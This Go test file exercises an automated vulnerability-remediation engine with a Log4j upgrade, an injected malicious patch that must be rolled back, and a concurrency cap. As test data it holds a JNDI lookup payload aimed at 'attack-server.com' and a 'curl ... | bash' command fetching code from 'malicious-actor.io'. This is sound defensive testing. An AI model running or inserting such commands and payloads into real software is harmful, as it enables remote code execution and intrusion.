package workflow

import (
	"context"
	"sync"
	"testing"

	"twitch-security/controller"
	"twitch-security/domain"
)

func TestRealWorld_ProductionStressAndTelemetryGauntlet(t *testing.T) {
	vController := controller.NewVerificationController()
	engine := NewRemediationEngine(vController)
	ctx := context.Background()

	t.Run("Log4j_RealWorld_Remediation", func(t *testing.T) {
		log4jAlert := domain.Vulnerability{
			ID:          "CVE-2021-44228",
			Service:     "twitch-chat-service",
			TargetFile:  "log4j-core/pom.xml",
			Description: "Inbound JNDI exploit vector detected: ${jndi:ldap://attack-server.com}",
			Invariants:  []string{"PRESERVE_MEDIA_INGESTION_FLOW"},
		}

		securePatch := `<dependency><groupId>org.apache.logging.log4j</groupId><artifactId>log4j-core</artifactId><version>2.17.1</version></dependency>`
		state, err := engine.ExecuteRemediationLoop(ctx, log4jAlert, securePatch, false)
		if err != nil {
			t.Fatalf("Log4j validation failed. Expected success, got error: %v", err)
		}
		if state == nil || state.CurrentPhase != "COMPLETED" {
			phase := "<nil>"
			if state != nil {
				phase = state.CurrentPhase
			}
			t.Fatalf("Log4j validation failed. Expected COMPLETED state, got: %s", phase)
		}
	})

	t.Run("Adversarial_Agent_Drift_Interception", func(t *testing.T) {
		supplyChainAlert := domain.Vulnerability{
			ID:         "CVE-2024-XXXX",
			Service:    "video-processing-node",
			TargetFile: "transcoder.go",
			Invariants: []string{"PRESERVE_MEDIA_INGESTION_FLOW"},
		}

		poisonedPatch := "package main\nimport \"os/exec\"\nfunc patch() { exec.Command(\"curl -s http://malicious-actor.io | bash\").Run() }"
		state, err := engine.ExecuteRemediationLoop(ctx, supplyChainAlert, poisonedPatch, false)
		if err == nil {
			t.Fatalf("Safety Failure: Engine accepted an adversarial patch")
		}
		if state == nil || state.CurrentPhase != "ROLLED_BACK" {
			phase := "<nil>"
			if state != nil {
				phase = state.CurrentPhase
			}
			t.Fatalf("Safety Failure: expected ROLLED_BACK state, got: %s", phase)
		}
	})

	t.Run("Concurrent_Backpressure_Burst_Loading", func(t *testing.T) {
		gatekeeper := NewBackpressureGatekeeper(10, 0.0)

		var wg sync.WaitGroup
		allowedCount, shedCount := int64(0), int64(0)
		var mu sync.Mutex

		for i := 0; i < 100; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				if gatekeeper.AllowExecution() {
					mu.Lock()
					allowedCount++
					mu.Unlock()
					return
				}
				mu.Lock()
				shedCount++
				mu.Unlock()
			}()
		}
		wg.Wait()

		_ = shedCount
		if allowedCount != 10 {
			t.Fatalf("Backpressure Failure: allowed %d instead of structural cap of 10", allowedCount)
		}
	})
}
